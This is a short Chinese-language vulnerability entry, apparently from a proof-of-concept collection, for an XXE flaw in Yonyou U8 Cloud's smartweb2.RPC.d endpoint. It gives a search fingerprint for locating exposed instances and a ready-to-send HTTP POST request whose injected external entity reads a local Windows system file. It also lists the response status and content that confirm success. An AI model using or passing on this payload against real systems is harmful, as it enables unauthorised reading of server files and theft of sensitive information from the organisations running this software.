﻿# 用友U8 Cloud smartweb2.RPC.d 存在XXE漏洞

> 更新时间：2024-01-22

> 漏洞编号：

> 漏洞说明：用友U8cloud顾名思义，用友的系列产品之一。用友U8 Cloud smartweb2.RPC.d存在xml外部实体注入漏洞，攻击者可以通过此漏洞读取系统文件，获取敏感信息等。

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：


> 验证文件来源：用友U8 Cloud smartweb2.RPC.d 存在XXE漏洞.poc
